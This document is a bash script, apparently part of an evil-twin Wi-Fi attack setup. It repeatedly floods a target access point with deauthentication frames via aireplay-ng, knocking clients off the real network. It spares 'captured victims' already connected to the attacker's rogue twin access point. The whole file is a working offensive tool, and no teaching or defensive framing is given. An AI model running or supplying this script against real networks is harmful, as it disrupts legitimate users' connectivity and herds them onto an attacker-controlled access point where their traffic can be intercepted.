#!/bin/bash
# Smart Deauth - Only deauth clients NOT connected to our Twin
# This lets captured victims stay connected while still attacking new targets

DEAUTH_TARGET="$1"  # Real AP BSSID to deauth
DEAUTH_INTERFACE="alfa1"
AP_INTERFACE="alfa0"

if [ -z "$DEAUTH_TARGET" ]; then
    echo "Usage: ./smart_deauth.sh <TARGET_BSSID>"
    exit 1
fi

echo "[*] Smart Deauth starting"
echo "[*] Target AP: $DEAUTH_TARGET"
echo "[*] Protecting clients on $AP_INTERFACE"

while true; do
    # Get list of clients connected to OUR Twin (protected)
    PROTECTED_MACS=$(sudo hostapd_cli -i $AP_INTERFACE all_sta 2>/dev/null | grep -oE "([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}" | tr '\n' '|')
    
    if [ -n "$PROTECTED_MACS" ]; then
        # Remove trailing pipe
        PROTECTED_MACS=${PROTECTED_MACS%|}
        echo "[*] Protected clients: $PROTECTED_MACS"
    fi
    
    # Get clients on real AP (we want to deauth these)
    # Use airodump-ng briefly to scan, or just broadcast deauth
    # For simplicity, we send broadcast deauth but protected clients ignore it
    # because they're already on our Twin
    
    # Send burst deauth to real AP (5 packets)
    echo "[*] Sending deauth burst to $DEAUTH_TARGET"
    sudo aireplay-ng --deauth 5 -a "$DEAUTH_TARGET" "$DEAUTH_INTERFACE" >> /tmp/smart_deauth_detail.log 2>&1
    
    # Wait before next burst (longer gap = more stable for connected clients)
    sleep 15
done
